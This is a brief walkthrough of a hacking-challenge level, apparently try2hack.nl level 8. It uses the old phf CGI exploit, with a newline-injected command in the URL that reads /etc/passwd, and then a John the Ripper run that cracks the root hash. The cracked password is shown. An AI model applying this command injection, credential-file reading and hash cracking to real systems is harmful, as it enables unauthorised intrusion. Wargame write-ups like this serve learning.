#### Level 8

I googled cgi + phf and found http://insecure.org/sploits/phf-cgi.html which gave me this old phf exploit:
http://try2hack.nl/cgi-bin/phf?Qalias=%0A/bin/cat%20/etc/passwd

Now you see the root account and the encrypted password.
Then store the passwd file on your computer and use the classic John the Ripper program to crack it:

```
C:\john-386 c:/passwd
Loaded 1 password hash (Traditional DES [24/32 4K])
arse    (root)
guesses: 1  time: 0:00:00:05 (3)    c/s: 86724  trying: ddmy - arsy
```

Password of root is "arse" :)